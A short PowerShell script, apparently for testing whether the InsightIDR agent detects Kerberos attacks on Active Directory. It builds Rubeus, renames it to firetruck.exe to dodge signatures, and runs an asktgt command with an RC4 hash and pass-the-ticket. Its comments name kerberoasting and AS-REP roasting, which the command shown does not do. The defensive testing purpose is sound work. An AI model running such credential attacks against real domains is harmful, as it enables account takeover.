# Script works best if Run As Administrator

# Tests InsightIDR's agent's ability to detect a kerberoasting attack

cd $HOME\Downloads\

# Go download some malicious tools
#   You'll need Microsoft Visual Studio (free edition) to compile Rubeus into binaries since
#       their GitHub page doesn't offer compiled versions
#   https://github.com/GhostPack/Rubeus

# Copy and rename the known malicous file to make sure it is signature based
cd $HOME\source\repos\Rubeus\Rubeus\bin\debug
cp Rubeus.exe $HOME\Desktop\firetruck.exe

# Execution of known-bad PE (Rubeus renamed as Firetruck.exe)
# usage of Rubeus (as Firetruck.exe) to perform kerberoasting
# usage of Rubeus (as Firetruck.exe) to perform AS-REP roasting
# change REDACTED to the username, ex: jdoe.adm
./Rubeus.exe asktgt /user:REDACTED /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt
